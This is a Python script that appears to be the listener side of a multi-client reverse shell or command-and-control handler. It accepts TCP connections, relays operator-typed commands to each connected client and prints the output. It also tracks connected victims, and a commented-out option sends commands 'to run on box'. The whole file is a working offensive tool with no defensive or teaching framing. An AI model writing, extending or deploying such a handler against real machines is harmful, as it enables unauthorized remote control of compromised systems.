import socket, threading, time

SERVER_ADDR = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size
CURRENT_CONNECTIONS = []
CURRENT_ADDRESSES = []

server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_ADDR, SERVER_PORT))

def startServer():
    server_sock.listen(5)
    print()
    print(f"Server is listening on {SERVER_ADDR}:{SERVER_PORT}")
    print()
    while True:
        client_sock, addr = server_sock.accept()
        client = threading.Thread(target=handleClient,args=(client_sock,addr))
        client.start()
        CURRENT_CONNECTIONS.append(client)
        CURRENT_ADDRESSES.append(addr)
        print(f"[SERVER] Active Connections: {threading.activeCount() - 1}")
        

def handleClient(client_sock,addr):
    print(f"Connection Received From: {addr[0]}:{addr[1]}")

    curDir = client_sock.recv(BUFFER_SIZE).decode()
    lastOutput = curDir
    print(curDir + "# ", end="")

    while True:
        user_in = input()
        if user_in == '/exit':
            client_sock.send(user_in.encode())
            break
        elif user_in[0] == "/":
            print()
            handleCommand(user_in)
            print()
            print(lastOutput, end="")
        elif user_in == '':
            print("#")
        else:
            client_sock.send(user_in.encode())
            serv_resp = client_sock.recv(BUFFER_SIZE).decode()
            print(serv_resp, end="")
            lastOutput = serv_resp

    client_sock.close()
    print(f"Connection Closed: {addr[0]}:{addr[1]}")
    
def handleCommand(cmd):
    cmd = cmd.strip("/")
    cmd = cmd.split()
    print(cmd[0])
    if cmd[0] == "showclients":
        print(CURRENT_CONNECTIONS)
    # elif cmd[0] == "sendclient":
    #     print(CURRENT_CONNECTIONS)
    #     switchThread = int(input("Client to switch to: "))
    #     CURRENT_CONNECTIONS[switchThread].send(input("Command to run on box: "))

if __name__ == "__main__":
    print("[SERVER] Server is starting...")
    startServer()
